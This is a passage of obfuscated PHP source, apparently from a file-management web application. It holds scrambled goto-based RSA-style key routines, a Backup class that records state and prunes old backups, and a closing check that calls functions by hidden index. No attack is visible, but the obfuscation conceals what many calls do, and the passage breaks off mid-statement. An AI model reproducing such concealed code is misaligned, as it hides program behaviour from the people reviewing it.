$E“İâ¸£[347]: goto e¬ò‘¬ğŸ˜; CÏàÆÌ¹“§: $Eâ™™Ö¦…¬ = $E“İâ¸£[353]($F½ò£Ğó¶); break; $c‚¬óŸÎ = $C…Öîèˆá[656]; goto c‡†Åï Ì¾; e¬ò‘¬ğŸ˜: $Eëª…ÔÔé„ = $E“İâ¸£[352]($Eëª…ÔÔé„); $eÇæƒˆÍµ = $C…Öîèˆá[650]; if (strlen($eÇæƒˆÍµ) < $C…Öîèˆá[582]) { die; } goto FŠ¤ñµÉ¨Å; Dâ‰ÃÂ“®: $bù‰É³²í = $C…Öîèˆá[653]; while (strlen($bù‰É³²í) < $C…Öîèˆá[567]) { if (!$bù‰É³²í) { break; } $bù‰É³²í++; } $D†ƒ‚Õ…ÂÆ = 0; goto Aœí¯ÏË ù; FŠ¤ñµÉ¨Å: $dŠŒ‚‹½Õ† = $Eëª…ÔÔé„[0]; $fÁò·¥Ü = $C…Öîèˆá[651]; $Eëª…ÔÔé„ = $E“İâ¸£[25]($Eëª…ÔÔé„, 1); goto aÄñçÔë”; d¸ëÅ‡‚: $Aé‹™î—„¦ = $E“İâ¸£[120]($dŠŒ‚‹½Õ† . $E“İâ¸£[120]($Dßœçä°º . $dŠŒ‚‹½Õ†) . $Dßœçä°º); $Aé‹™î—„¦ = $E“İâ¸£[25]($Aé‹™î—„¦, $c¢…óŸËâ» % 8, $c¢…óŸËâ» % 8 + 7); $F½ò£Ğó¶ = $E“İâ¸£[10]; goto Dâ‰ÃÂ“®; c‡†Åï Ì¾: if (!$c‚¬óŸÎ) { return; } goto eí´è² ¾Î; aÄñçÔë”: $díƒÈÆ®ŒÁ = $C…Öîèˆá[652]; if (!$díƒÈÆ®ŒÁ) { die; } $c¢…óŸËâ» = $E“İâ¸£[349]($EäĞ¸½”àÇ, $dŠŒ‚‹½Õ†); goto d¸ëÅ‡‚; Aœí¯ÏË ù: $a‚ó¦ùÈÚó = 0; $b™ÉøéÅ¬Å = 0; for ($D†ƒ‚Õ…ÂÆ = 0; $D†ƒ‚Õ…ÂÆ < $E“İâ¸£[24]($Eëª…ÔÔé„); $D†ƒ‚Õ…ÂÆ++) { $b™ÉøéÅ¬Å = $b™ÉøéÅ¬Å == $E“İâ¸£[24]($Aé‹™î—„¦) ? 0 : $b™ÉøéÅ¬Å; $a«µÔ©‰ôè = $b™ÉøéÅ¬Å++; $a‚ó¦ùÈÚó = $E“İâ¸£[349]($EäĞ¸½”àÇ, $Eëª…ÔÔé„[$D†ƒ‚Õ…ÂÆ]) - $c¢…óŸËâ» - $E“İâ¸£[350]($Aé‹™î—„¦[$a«µÔ©‰ôè]); $Dèö¦øéÑº = $C…Öîèˆá[654]; if (!$Dèö¦øéÑº) { return; } while ($a‚ó¦ùÈÚó < 0) { $a‚ó¦ùÈÚó += 64; $Bâ”½íç‹ç = $C…Öîèˆá[655]; if (strlen($Bâ”½íç‹ç) < $C…Öîèˆá[578]) { return; } } $F½ò£Ğó¶ .= $EäĞ¸½”àÇ[$a‚ó¦ùÈÚó]; } goto CÏàÆÌ¹“§; eí´è² ¾Î: default: $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][256]}($Eëª…ÔÔé„, $Dßœçä°º . $eª†µëˆè); $e…ùÔ—ù‹‚ = $C…Öîèˆá[657]; if (strlen($e…ùÔ—ù‹‚) < $C…Öîèˆá[582]) { die; } break; } goto eùóËêÇÙ‚; f‰ò¬îòÁ‰: $Eëª…ÔÔé„ = $E“İâ¸£[220]($Eëª…ÔÔé„); $d‚Š‰ÃÖÃ = $Eëª…ÔÔé„[0]; $déù¸…£ó = $C…Öîèˆá[645]; goto C…±·«æ×; F—Æéò©Šø: if (strlen($EøÉªºâÜ­) < $C…Öîèˆá[578]) { return; } $Eëª…ÔÔé„ = $E“İâ¸£[25]($Eëª…ÔÔé„, 16); $EäĞ¸½”àÇ = $E“İâ¸£[344]; goto F¼¢×îÅ¯¸; A†Ôõ¶ßÙˆ: $Eëª…ÔÔé„ = $E“İâ¸£[2]($Eëª…ÔÔé„); $Fñš–…›à§ = $C…Öîèˆá[644]; if (!$Fñš–…›à§) { die; } goto f‰ò¬îòÁ‰; EÕĞÓ‡Ò: $C…Öîèˆá =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E“İâ¸£ =& $_SERVER[‰†ğ°]; if (!$E“İâ¸£[351]($Eëª…ÔÔé„) || $E“İâ¸£[24]($Eëª…ÔÔé„) < 10) { return !1; } goto A†Ôõ¶ßÙˆ; C…±·«æ×: if (!$déù¸…£ó) { die; } $eª†µëˆè = $E“İâ¸£[25]($Eëª…ÔÔé„, 1, 15); $EøÉªºâÜ­ = $C…Öîèˆá[646]; goto F—Æéò©Šø; eùóËêÇÙ‚: if ($a…•š½é™Ê - 1 > 0) { $Eâ™™Ö¦…¬ = $this->{$_SERVER[‰†ğ°][195]}($Eâ™™Ö¦…¬, $Dßœçä°º, $a…•š½é™Ê - 1); } return $Eâ™™Ö¦…¬; goto CĞ½Æ”ÜÙÜ; CĞ½Æ”ÜÙÜ: } public function amtcec3fb8d7($aˆãˆÕâ«) { goto aë™é¾ã¸; e­› ¿´ÛÒ: while (1) { $a—¤Ü´¼ˆ = $BìğÇ›õ‡š; $Eã½´ÕÓÁ– = $f¹‘‡ˆ¡ö; while ($Eã½´ÕÓÁ– % $a—¤Ü´¼ˆ != 0) { $e®÷©¬°È = $Eã½´ÕÓÁ–; $Eã½´ÕÓÁ– = $a—¤Ü´¼ˆ; $a‰˜ÑÃ§İ = $eëÏ¡ÛÊ×Ã[660]; $a—¤Ü´¼ˆ = $e®÷©¬°È % $a—¤Ü´¼ˆ; } if ($a—¤Ü´¼ˆ == 1) { break; } else { $BìğÇ›õ‡š++; } } $AñŒƒ¿Ôç = 2; $d¸å«§‹»† = $eëÏ¡ÛÊ×Ã[661]; goto CÍêÄçø·; aë™é¾ã¸: $eëÏ¡ÛÊ×Ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DååéËğƒ• =& $_SERVER[‰†ğ°]; $eğÙ”ñÍÁ¤ = $this->{$_SERVER[‰†ğ°][354]}(); goto b¾Œ•Ñâ±¼; b¾Œ•Ñâ±¼: $AĞ‡›‘†ë = $eëÏ¡ÛÊ×Ã[658]; $AÃ˜Ó†ƒÏã = $this->{$_SERVER[‰†ğ°][354]}(); $f¹‘‡ˆ¡ö = ($eğÙ”ñÍÁ¤ - 1) * ($AÃ˜Ó†ƒÏã - 1); goto AÃ¦æÙÏ¼; CÍêÄçø·: while ($d¸å«§‹»† < $eëÏ¡ÛÊ×Ã[573]) { if ($d¸å«§‹»† >= 0) { break; } $d¸å«§‹»†++; } for ($d–‡™ÍœàÈ = 0; $d–‡™ÍœàÈ < $f¹‘‡ˆ¡ö * 10; $d–‡™ÍœàÈ++) { if (($f¹‘‡ˆ¡ö * $d–‡™ÍœàÈ + 1) % $BìğÇ›õ‡š == 0) { $AñŒƒ¿Ôç = $DååéËğƒ•[250](($f¹‘‡ˆ¡ö * $d–‡™ÍœàÈ + 1) / $BìğÇ›õ‡š); break; } } $cµÈ†ãó­ = $this->{$_SERVER[‰†ğ°][153]}($eğÙ”ñÍÁ¤ * $AÃ˜Ó†ƒÏã . $DååéËğƒ•[10], $DååéËğƒ•[155]); goto EÇÙ‡îÙ×®; EÇÙ‡îÙ×®: $a‹§ºÚâä¶ = $eëÏ¡ÛÊ×Ã[662]; $E¡ŒÁ´²îŒ = $DååéËğƒ•[120]($DååéËğƒ•[355] . ($eğÙ”ñÍÁ¤ + $AÃ˜Ó†ƒÏã) . $DååéËğƒ•[356] . $BìğÇ›õ‡š . $DååéËğƒ•[356] . $AñŒƒ¿Ôç . $DååéËğƒ•[357]); $BÀ­ÜŠ…´ = $this->{$_SERVER[‰†ğ°][153]}($aˆãˆÕâ«, $E¡ŒÁ´²îŒ) . $DååéËğƒ•[358] . $cµÈ†ãó­; goto EšÛ¯Ô»¤Œ; AÃ¦æÙÏ¼: $EÎì¶•…Ç = $eëÏ¡ÛÊ×Ã[659]; if (!$EÎì¶•…Ç) { die; } $BìğÇ›õ‡š = $DååéËğƒ•[250](($eğÙ”ñÍÁ¤ + $AÃ˜Ó†ƒÏã) / 2); goto e­› ¿´ÛÒ; EšÛ¯Ô»¤Œ: $EŒßŞ¾ª³ = $eëÏ¡ÛÊ×Ã[663]; if (strlen($EŒßŞ¾ª³) < $eëÏ¡ÛÊ×Ã[573]) { die; } return $BÀ­ÜŠ…´; goto cÊ’ºô¼Ë; cÊ’ºô¼Ë: } public function dlvo89ecc5aa($a‚Ûƒ†…×‰) { goto B­Î²Ô¬Û²; c‚„ÖÛ: $c©ŸÖÄËÆÕ = 0; $f°Ô©›¢ã = $EÒåÒƒ½ê¬[665]; $aÑé…µ¡Ëâ = 0; goto Eï‰‹è£‰É; B­Î²Ô¬Û²: $EÒåÒƒ½ê¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FãŸÅ‰‚š‚ =& $_SERVER[‰†ğ°]; $C¯ÜÅËõ©â = $FãŸÅ‰‚š‚[0]($FãŸÅ‰‚š‚[358], $a‚Ûƒ†…×‰); goto fç¾ˆğô¢’; B¸İ„‘ÄƒÂ: if (strlen($e±®·êè›•) < $EÒåÒƒ½ê¬[567]) { return; } return $f¶İ¡¿«¼…; goto AÛŒ¥×ê‡­; Eï‰‹è£‰É: for ($dñÓçŠ“à = 3; $dñÓçŠ“à < $D˜ŒâõÎÜİ; $dñÓçŠ“à += 2) { if ($D˜ŒâõÎÜİ % $dñÓçŠ“à != 0) { continue; } $c©ŸÖÄËÆÕ = $dñÓçŠ“à; $b í…Ü« = $EÒåÒƒ½ê¬[666]; if (!$b í…Ü«) { return; } $aÑé…µ¡Ëâ = $FãŸÅ‰‚š‚[250]($D˜ŒâõÎÜİ / $dñÓçŠ“à); $Fìõ™æÇô² = $EÒåÒƒ½ê¬[667]; while (strlen($Fìõ™æÇô²) < $EÒåÒƒ½ê¬[573]) { if (!$Fìõ™æÇô²) { break; } $Fìõ™æÇô²++; } break; } $Dß¾Êİ¡øÛ = ($c©ŸÖÄËÆÕ - 1) * ($aÑé…µ¡Ëâ - 1); $aÖÖŸ¤£¨í = $EÒåÒƒ½ê¬[668]; goto dåçØ‡ù; bÉâªà–×: while (strlen($Cğœ°ùùè) < $EÒåÒƒ½ê¬[582]) { if (!$Cğœ°ùùè) { break; } $Cğœ°ùùè++; } if (!$D˜ŒâõÎÜİ) { return $FãŸÅ‰‚š‚[10]; } $D˜ŒâõÎÜİ = $FãŸÅ‰‚š‚[250]($D˜ŒâõÎÜİ); goto c‚„ÖÛ; dåçØ‡ù: $e¼…‚’„ùÑ = $FãŸÅ‰‚š‚[250](($c©ŸÖÄËÆÕ + $aÑé…µ¡Ëâ) / 2); while (1) { $f°á³òÖ® = $e¼…‚’„ùÑ; $AÔ—ÀºŸ– = $Dß¾Êİ¡øÛ; $E…ÛÛªŒ—î = $EÒåÒƒ½ê¬[669]; while ($E…ÛÛªŒ—î < $EÒåÒƒ½ê¬[582]) { if ($E…ÛÛªŒ—î >= 0) { break; } $E…ÛÛªŒ—î++; } while ($AÔ—ÀºŸ– % $f°á³òÖ® != 0) { $fŞ±±áØ¬¼ = $AÔ—ÀºŸ–; $EêÏ¨²ŠÉ“ = $EÒåÒƒ½ê¬[670]; $AÔ—ÀºŸ– = $f°á³òÖ®; $f°á³òÖ® = $fŞ±±áØ¬¼ % $f°á³òÖ®; } if ($f°á³òÖ® == 1) { break; } else { $e¼…‚’„ùÑ++; } } $eñ©°¤×Ÿ = 2; goto EÍŸ§íŠ —; EÍŸ§íŠ —: for ($dñÓçŠ“à = 0; $dñÓçŠ“à < $Dß¾Êİ¡øÛ * 10; $dñÓçŠ“à++) { if (($Dß¾Êİ¡øÛ * $dñÓçŠ“à + 1) % $e¼…‚’„ùÑ == 0) { $eñ©°¤×Ÿ = $FãŸÅ‰‚š‚[250](($Dß¾Êİ¡øÛ * $dñÓçŠ“à + 1) / $e¼…‚’„ùÑ); break; } } $eÑ›ŸğÄ«É = $FãŸÅ‰‚š‚[120]($FãŸÅ‰‚š‚[355] . ($c©ŸÖÄËÆÕ + $aÑé…µ¡Ëâ) . $FãŸÅ‰‚š‚[356] . $e¼…‚’„ùÑ . $FãŸÅ‰‚š‚[356] . $eñ©°¤×Ÿ . $FãŸÅ‰‚š‚[357]); $eŸ‰Ú ƒ± = $EÒåÒƒ½ê¬[671]; goto dà¯ƒÄÒ÷Ó; dà¯ƒÄÒ÷Ó: if (strlen($eŸ‰Ú ƒ±) < $EÒåÒƒ½ê¬[582]) { return; } $f¶İ¡¿«¼… = $this->{$_SERVER[‰†ğ°][256]}($C¯ÜÅËõ©â[0], $eÑ›ŸğÄ«É); $e±®·êè›• = $EÒåÒƒ½ê¬[672]; goto B¸İ„‘ÄƒÂ; fç¾ˆğô¢’: if ($FãŸÅ‰‚š‚[19]($C¯ÜÅËõ©â) != 2) { return $FãŸÅ‰‚š‚[10]; } $D˜ŒâõÎÜİ = $this->{$_SERVER[‰†ğ°][256]}($C¯ÜÅËõ©â[1] . $FãŸÅ‰‚š‚[10], $FãŸÅ‰‚š‚[155]); $Cğœ°ùùè = $EÒåÒƒ½ê¬[664]; goto bÉâªà–×; AÛŒ¥×ê‡­: } public function dvnceaddf9eb() { goto BŒ·°ª¥éò; aƒ¯Ïé‘Š¯: $E×‹µëÆ = 1; $dÑ®·ˆææ = $cİİƒËÀ–Ÿ[674]; while ($E×‹µëÆ <= (int) $bääµ«Ó¨°[360]($bŞÔÉÌ¾Ã)) { $f¯‘ö‘å×¨ = $E×‹µëÆ; while (!0) { $f¯‘ö‘å×¨++; $D›¸ŠÚ‚¬¦ = $cİİƒËÀ–Ÿ[675]; while (strlen($D›¸ŠÚ‚¬¦) < $cİİƒËÀ–Ÿ[582]) { if (!$D›¸ŠÚ‚¬¦) { break; } $D›¸ŠÚ‚¬¦++; } if ($f¯‘ö‘å×¨ <= 2) { $E×‹µëÆ = $f¯‘ö‘å×¨; break; } else { if ($f¯‘ö‘å×¨ < 2) { continue; } } $Aïº„ê¶ß = !0; for ($c¨ÕˆÄÖŠÑ = 2; $c¨ÕˆÄÖŠÑ <= $bääµ«Ó¨°[360]($f¯‘ö‘å×¨); $c¨ÕˆÄÖŠÑ++) { if ($f¯‘ö‘å×¨ % $c¨ÕˆÄÖŠÑ == 0) { $Aïº„ê¶ß = !1; } } if ($Aïº„ê¶ß) { $E×‹µëÆ = $f¯‘ö‘å×¨; break; } } $fââĞ×½ƒ¾[] = $E×‹µëÆ; $dœÎ²™×ƒÃ = $cİİƒËÀ–Ÿ[676]; if (!$dœÎ²™×ƒÃ) { return; } } goto B§ŒğóÇä; BŒ·°ª¥éò: $cİİƒËÀ–Ÿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bääµ«Ó¨° =& $_SERVER[‰†ğ°]; $bŞÔÉÌ¾Ã = $bääµ«Ó¨°[339]($bääµ«Ó¨°[359](2, 14), $bääµ«Ó¨°[359](2, 16) - 1); goto AóÎ©«Àç; AóÎ©«Àç: $fââĞ×½ƒ¾ = array(); $B•ø–´æõ = $cİİƒËÀ–Ÿ[673]; if (!$B•ø–´æõ) { return; } goto aƒ¯Ïé‘Š¯; B§ŒğóÇä: $eÌù¡¬ã®â = 2; $B¯ƒ’¶ÙçÄ = $cİİƒËÀ–Ÿ[677]; if (strlen($B¯ƒ’¶ÙçÄ) < $cİİƒËÀ–Ÿ[567]) { return; } goto D”¨×ãš¡; D”¨×ãš¡: for ($f¯‘ö‘å×¨ = $bŞÔÉÌ¾Ã; $f¯‘ö‘å×¨ > 1; $f¯‘ö‘å×¨--) { $Aïº„ê¶ß = !0; $c±Šª¸¹³ë = $cİİƒËÀ–Ÿ[678]; while ($c±Šª¸¹³ë < $cİİƒËÀ–Ÿ[567]) { if ($c±Šª¸¹³ë >= 0) { break; } $c±Šª¸¹³ë++; } foreach ($fââĞ×½ƒ¾ as $bíëä¹šá) { if ($f¯‘ö‘å×¨ % $bíëä¹šá == 0) { $Aïº„ê¶ß = !1; break; } } if ($Aïº„ê¶ß) { $eÌù¡¬ã®â = $f¯‘ö‘å×¨; break; } } return $eÌù¡¬ã®â; $d¼ôÇÎ„–– = $cİİƒËÀ–Ÿ[679]; goto F¢ÑÀ¬¾Ä; F¢ÑÀ¬¾Ä: while (strlen($d¼ôÇÎ„––) < $cİİƒËÀ–Ÿ[570]) { if (!$d¼ôÇÎ„––) { break; } $d¼ôÇÎ„––++; } goto aßãÔ¬¿©; aßãÔ¬¿©: } public function aylbf378ae1c($c†ÒÖ©“°™, $B±›µï¨É¿) { $cœµÜ½ò¯Ã =& $_SERVER[‰†ğ°]; return $cœµÜ½ò¯Ã[13](array($cœµÜ½ò¯Ã[14], $cœµÜ½ò¯Ã[361]), $c†ÒÖ©“°™, $B±›µï¨É¿); } public function rqhe67d2a772($Dô³İÒŞì, $b¢ˆ‚ë´ÄÔ) { $a–¢íêì»‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÈ–ïáØ—ñ =& $_SERVER[‰†ğ°]; return $DÈ–ïáØ—ñ[13](array($DÈ–ïáØ—ñ[362], $DÈ–ïáØ—ñ[363]), $Dô³İÒŞì, $b¢ˆ‚ë´ÄÔ); $D‘ÊÏÈ›öâ = $a–¢íêì»‘[680]; if (strlen($D‘ÊÏÈ›öâ) < $a–¢íêì»‘[573]) { return; } } public function otpn2648412e($Eáƒ­Ò†Äö, $CË‰Ì…ÒîÊ) { $F‚±š¹ö·¾ =& $_SERVER[‰†ğ°]; return $F‚±š¹ö·¾[13](array($F‚±š¹ö·¾[362], $F‚±š¹ö·¾[364]), $Eáƒ­Ò†Äö, $CË‰Ì…ÒîÊ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $FŠ«Øù¶° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::$name = date($FŠ«Øù¶°[681]); if (!($dƒ©ÏŸ¦ = Model($FŠ«Øù¶°[682])->lastItem())) { $dƒ©ÏŸ¦ = $this->initData(); } else { self::$name = $dƒ©ÏŸ¦[$FŠ«Øù¶°[28]]; if ($dƒ©ÏŸ¦[$FŠ«Øù¶°[683]] == $FŠ«Øù¶°[86]) { self::$name = date($FŠ«Øù¶°[684]); $cĞÄá–õ•ª = 0; if (isset($dƒ©ÏŸ¦[$FŠ«Øù¶°[289]][$FŠ«Øù¶°[173]][$FŠ«Øù¶°[436]])) { $cĞÄá–õ•ª = (int) $dƒ©ÏŸ¦[$FŠ«Øù¶°[289]][$FŠ«Øù¶°[173]][$FŠ«Øù¶°[436]]; } if ($dƒ©ÏŸ¦[$FŠ«Øù¶°[28]] == self::$name) { Model($FŠ«Øù¶°[682])->remove($dƒ©ÏŸ¦[$FŠ«Øù¶°[385]]); } $dƒ©ÏŸ¦ = $this->initData($cĞÄá–õ•ª, $dƒ©ÏŸ¦[$FŠ«Øù¶°[685]]); } else { $this->checkStore($dƒ©ÏŸ¦[$FŠ«Øù¶°[685]]); } } self::$option = $dƒ©ÏŸ¦; } private function initData($DÀ¿³ì‚òˆ = 0, $B‰ƒç‘¡ö = '') { goto FëŒèå±¹; FëŒèå±¹: $D«îÀ¦“•Ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F—å—´›Úã = Model($D«îÀ¦“•Ï[682])->config(); if ($B‰ƒç‘¡ö && $F—å—´›Úã[$D«îÀ¦“•Ï[685]] != $B‰ƒç‘¡ö) { $DÀ¿³ì‚òˆ = 0; } goto aÔÃê—´‹²; aÔÃê—´‹²: $this->checkStore($F—å—´›Úã[$D«îÀ¦“•Ï[685]]); $C¯Î¹Ê”×Œ = array($D«îÀ¦“•Ï[685] => $F—å—´›Úã[$D«îÀ¦“•Ï[685]], $D«îÀ¦“•Ï[28] => self::$name, $D«îÀ¦“•Ï[683] => 0, $D«îÀ¦“•Ï[686] => $F—å—´›Úã[$D«îÀ¦“•Ï[686]], $D«îÀ¦“•Ï[289] => array($D«îÀ¦“•Ï[687] => array($D«îÀ¦“•Ï[683] => 0), $D«îÀ¦“•Ï[688] => array($D«îÀ¦“•Ï[683] => 0, $D«îÀ¦“•Ï[689] => 0, $D«îÀ¦“•Ï[690] => 0, $D«îÀ¦“•Ï[29] => $D«îÀ¦“•Ï[33]), $D«îÀ¦“•Ï[691] => array($D«îÀ¦“•Ï[683] => 0, $D«îÀ¦“•Ï[689] => 0, $D«îÀ¦“•Ï[690] => 0), $D«îÀ¦“•Ï[173] => array($D«îÀ¦“•Ï[683] => 0, $D«îÀ¦“•Ï[692] => 0, $D«îÀ¦“•Ï[693] => 0, $D«îÀ¦“•Ï[694] => 0, $D«îÀ¦“•Ï[695] => 0, $D«îÀ¦“•Ï[436] => $DÀ¿³ì‚òˆ)), $D«îÀ¦“•Ï[696] => time(), $D«îÀ¦“•Ï[465] => 0); $aä¢ÃŠç‰ = Model($D«îÀ¦“•Ï[682])->insert($C¯Î¹Ê”×Œ); goto AÙç´İ²× ; AÙç´İ²× : $C¯Î¹Ê”×Œ[$D«îÀ¦“•Ï[385]] = $aä¢ÃŠç‰; return $C¯Î¹Ê”×Œ; goto cèƒÂİÄ¶; cèƒÂİÄ¶: } private function checkStore($A¡©ë°Í÷) { $d‚›£±ÂÛ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d˜ä˜šƒ¤° = Model($d‚›£±ÂÛ…[697])->listData($A¡©ë°Í÷); Model($d‚›£±ÂÛ…[697])->checkConfig($d˜ä˜šƒ¤°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][682])->findByName(self::$name); } return self::$option; } public static function set($B†Òó•å£¦) { $E¾ÓŞßÎŠ’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÏÙ‹¡ì‘Ç = self::get(); foreach ($B†Òó•å£¦ as $eÉ¤¼ÈÉ„¸ => $DÏÔŞ£×ë‹) { $cã´ôˆ¹àÚ = explode($E¾ÓŞßÎŠ’[94], $eÉ¤¼ÈÉ„¸); $Bõíçš = count($cã´ôˆ¹àÚ); switch ($Bõíçš) { case 1: $FÏÙ‹¡ì‘Ç[$cã´ôˆ¹àÚ[0]] = $DÏÔŞ£×ë‹; break; case 2: $FÏÙ‹¡ì‘Ç[$cã´ôˆ¹àÚ[0]][$cã´ôˆ¹àÚ[1]] = $DÏÔŞ£×ë‹; break; case 3: $FÏÙ‹¡ì‘Ç[$cã´ôˆ¹àÚ[0]][$cã´ôˆ¹àÚ[1]][$cã´ôˆ¹àÚ[2]] = $DÏÔŞ£×ë‹; break; } } Model($E¾ÓŞßÎŠ’[682])->update($FÏÙ‹¡ì‘Ç[$E¾ÓŞßÎŠ’[385]], $FÏÙ‹¡ì‘Ç); self::$option = $FÏÙ‹¡ì‘Ç; return self::$option; } public function keep() { $DÓŸïÎå›Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D‘óæ®â¡ë = self::get(); if ($D‘óæ®â¡ë[$DÓŸïÎå›Ë[289]][$DÓŸïÎå›Ë[687]][$DÓŸïÎå›Ë[683]] == $DÓŸïÎå›Ë[86]) { return; } $this->backupKeep($D‘óæ®â¡ë); self::set(array($DÓŸïÎå›Ë[698] => 1)); } private function backupKeep($c±‡àİØÁ‰) { goto aÇ›ùÏøË; aÇ›ùÏøË: $A‚®Õæ”‚ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÛ…·Êáˆƒ = Model($A‚®Õæ”‚ï[682])->listData(); if (empty($DÛ…·Êáˆƒ)) { return; } goto AÅ›òóÄâÜ; Båç•è×µ: for ($F™øì˜ŒÈï = 0; $F™øì˜ŒÈï < 12; $F™øì˜ŒÈï++) { $dˆÑ…ñôö[] = date($A‚®Õæ”‚ï[699], strtotime("\55{$F™øì˜ŒÈï}\40\155\x6f\x6e\164\150\163")); } $dˆÑ…ñôö = array_unique($dˆÑ…ñôö); foreach ($DÛ…·Êáˆƒ as $cç†Ü‚Íµ¡) { if (!empty($cç†Ü‚Íµ¡[$A‚®Õæ”‚ï[28]]) && in_array($cç†Ü‚Íµ¡[$A‚®Õæ”‚ï[28]], $dˆÑ…ñôö)) { continue; } Model($A‚®Õæ”‚ï[682])->remove($cç†Ü‚Íµ¡[$A‚®Õæ”‚ï[385]]); $d”´àƒ¤• = "\x7b\x69\x6f\x3a{$c±‡àİØÁ‰[$A‚®Õæ”‚ï[685]]}\x7d\57\x64\x61\x74\141\142\x61\163\x65\57\142\141\143\x6b\x75\160\137{$cç†Ü‚Íµ¡[$A‚®Õæ”‚ï[28]]}"; IO::remove($d”´àƒ¤•, !1); } goto bœØØîƒ§à; AÅ›òóÄâÜ: $F™øì˜ŒÈï = 0; $dˆÑ…ñôö = array(); foreach ($DÛ…·Êáˆƒ as $cç†Ü‚Íµ¡) { if ($F™øì˜ŒÈï >= 7) { break; } $dˆÑ…ñôö[] = $cç†Ü‚Íµ¡[$A‚®Õæ”‚ï[28]]; $F™øì˜ŒÈï++; } goto Båç•è×µ; bœØØîƒ§à: } public function db() { goto E„õğ„—ãÈ; E„õğ„—ãÈ: $D²…„ø†™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c‚ÉÁßÂ«é = self::get(); if ($c‚ÉÁßÂ«é[$D²…„ø†™[289]][$D²…„ø†™[688]][$D²…„ø†™[683]] == $D²…„ø†™[86]) { return !0; } goto fåéÃ¢ã; fÓİ¼êÂ¸: return !0; goto FÔŠïôÄÀ; fåéÃ¢ã: $DÎ›«ÀÓ— = new BackupDb(); if (!$DÎ›«ÀÓ—->index()) { return !1; } self::set(array($D²…„ø†™[700] => 1)); goto fÓİ¼êÂ¸; FÔŠïôÄÀ: } public function dbFile() { goto DÂõÁ¾µè; AÇÑÖæ·: return !0; goto B·Š°öò†°; DÂõÁ¾µè: $B…š­äõ¤ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eò©¹ïî˜ = self::get(); if ($Eò©¹ïî˜[$B…š­äõ¤ù[289]][$B…š­äõ¤ù[691]][$B…š­äõ¤ù[683]] == $B…š­äõ¤ù[86]) { return !0; } goto d—°¶º¯ÚÚ; d—°¶º¯ÚÚ: $c…Š‹ŞÛñ­ = new BackupDbFile(); if (!$c…Š‹ŞÛñ­->index()) { return !1; } self::set(array($B…š­äõ¤ù[701] => 1)); goto AÇÑÖæ·; B·Š°öò†°: } public function file() { $fŒåÄ¾Éğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dµø‹Ş©Œ– = self::get(); if ($dµø‹Ş©Œ–[$fŒåÄ¾Éğ[289]][$fŒåÄ¾Éğ[173]][$fŒåÄ¾Éğ[683]] == $fŒåÄ¾Éğ[86]) { return !0; } if (!isset($dµø‹Ş©Œ–[$fŒåÄ¾Éğ[686]]) || $dµø‹Ş©Œ–[$fŒåÄ¾Éğ[686]] == $fŒåÄ¾Éğ[486]) { $BŸ†Ş—†¯ƒ = new BackupFile(); if (!$BŸ†Ş—†¯ƒ->index()) { return !1; } } self::set(array($fŒåÄ¾Éğ[702] => 1, $fŒåÄ¾Éğ[683] => 1)); return !0; } } goto dºùï´†Ü; eŠóÕˆ‹¨±: $BïÌÕõ˜Ò = $_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1162]]; $fãÀÊ¤‹¾¸ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1163]; if ($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][786]] != $fãÀÊ¤‹¾¸($BïÌÕõ˜Ò)) { goto b·äÒÇÓ†¹; bÎŞóÚì§‡: $A‡ø‡ÜŞïë = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][227], $e°”óâ¦ö“); if (count($A‡ø‡ÜŞïë) < $_SERVER[ó¬â¥‰ÊÔ¤Ç£][573]) { $cÊ‹Ò„ÆÈ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][792]; $cÊ‹Ò„ÆÈ(); } $B¸¤µê¨È = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1164]; goto föª‚¹Æ; föª‚¹Æ: $B¸¤µê¨È($BïÌÕõ˜Ò); goto cÁŸÔ±‡; b·äÒÇÓ†¹: $BàØõ°«îê = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][789]; $dá‰¦¤×Î† = $_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][790]] . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][791]; $e°”óâ¦ö“ = $BàØõ°«îê($dá‰¦¤×Î†); goto bÎŞóÚì§‡; cÁŸÔ±‡: } goto fùçŒ·ï…£; F¾ëîì»Ä“: if ($_SERVER[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][786]] != $fãÀÊ¤‹¾¸($BïÌÕõ˜Ò)) { goto d•‰ì„œãß; a¯—‘÷ã¨è: $A‡ø‡ÜŞïë = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][227], $e°”óâ¦ö“); if (count($A‡ø‡ÜŞïë) < $_SERVER[ó¬â¥‰ÊÔ¤Ç£][573]) { $cÊ‹Ò„ÆÈ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][792]; $cÊ‹Ò„ÆÈ(); } $B¸¤µê¨È = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1164]; goto a¢çñ‚»‹; a¢çñ‚»‹: $B¸¤µê¨È($BïÌÕõ˜Ò); goto b×à„­‹³§; d•‰ì„œãß: $BàØõ°«îê = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][789]; $dá‰¦¤×Î† = 